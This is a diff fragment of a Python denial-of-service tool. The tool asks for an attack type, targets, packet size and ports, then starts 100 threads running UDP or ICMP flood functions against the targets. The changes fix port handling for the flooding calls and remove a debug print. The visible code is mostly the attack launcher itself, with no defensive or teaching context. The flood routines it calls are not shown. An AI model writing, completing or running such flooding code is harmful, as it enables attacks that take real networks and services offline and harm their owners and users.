@@ -12,19 +12,19 @@ try:
     attack_type = int(input("choose a type of attack: \n volume based attack(1), protocol attack(2), application layer attack(3)\n")) #type of attack
     vector = input("target(targets):\n").split(" ") #target
     bye = input("number of bytes: \n").encode() #packet size
-    port = int(input("chose an internet port (or ports) for the attack: (if the attack is an application layer attack just press enter)\n")).split(" ")#network port(s)
-
+    port = input("chose an internet port (or ports) for the attack: (if the attack is an application layer attack just press enter)\n").split(" ")#network port(s)
+ #   bytes = bytes(bye)
+    
     if attack_type == choices[0]:
         volumeBaseAttack = ty.VolumeBasedAttack
         subtype0 = int(input("udp_flooding(1) or ICMP(2)\n"))
         
         if subtype0 == 1:
-            udp_floo = volumeBaseAttack.udp_flooding(bye, vectors)
+            udp_floo = volumeBaseAttack.udp_flooding(bye, vector, port)
             for i in range(100):
                 t = th.Thread(target=udp_floo, args=(i,))
                 Threads.append(t)
                 t.start()
-                print("debugging")
         else:
             ICMP = volumeBaseAttack.icmp(vector, bye, port)
             for i in range(100):
